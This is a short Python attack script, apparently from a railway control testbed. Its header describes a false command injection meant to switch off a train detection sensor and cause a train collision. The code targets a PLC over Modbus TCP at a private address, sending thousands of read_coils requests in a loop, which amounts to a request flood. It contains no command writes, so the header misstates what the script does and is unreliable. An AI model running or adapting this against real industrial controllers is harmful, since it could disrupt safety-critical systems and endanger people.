#-----------------------------------------------------------------------------
# Name:        false command injector.py
#
# Purpose:     a false command jection attack program to send the false train
#              detect sensor off and then control the train to collision.
#
# Author:      Yuancheng Liu
#
# Created:     2023/10/02
# Version:     v_0.1
# Copyright:   
# License:     
#-----------------------------------------------------------------------------

import time
from pyModbusTCP.client import ModbusClient
count = 0
hostIp = '10.107.105.7'
hostPort = 502

print('Try to connect to the target victim PLC: %s' %str(hostIp))
print('Start PLC read request thread')
print('Start pLC write request thread')
timeVal = time.time()
for i in range(2000):
    count +=1
    print('Try connect to the PLC')
    client = ModbusClient(host=hostIp, port=hostPort, auto_open=True)
    reuslt = None
    if client.open():
        print("send 100 request.")
        for i in range(100):
            reuslt = client.read_coils(0, 4)
        timeInt = time.time() - timeVal
        print("PLC request sending frequency: %s" %str(1000/timeInt))
        timeVal = time.time()
    if not reuslt: print("connection rejected")
    client.close()

